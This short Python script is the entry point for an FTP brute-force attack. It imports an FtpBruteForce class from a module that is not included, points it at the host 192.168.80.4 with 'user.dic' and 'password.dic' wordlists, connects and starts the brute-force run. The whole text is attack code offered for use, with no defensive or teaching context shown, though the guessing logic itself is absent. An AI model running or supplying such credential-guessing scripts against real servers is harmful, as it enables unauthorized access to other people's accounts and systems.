from ftp_brute_force import FtpBruteForce

if __name__ == '__main__':
    fbf = FtpBruteForce("192.168.80.4", r"user.dic", r"password.dic")
    fbf.connection()
    fbf.brute()
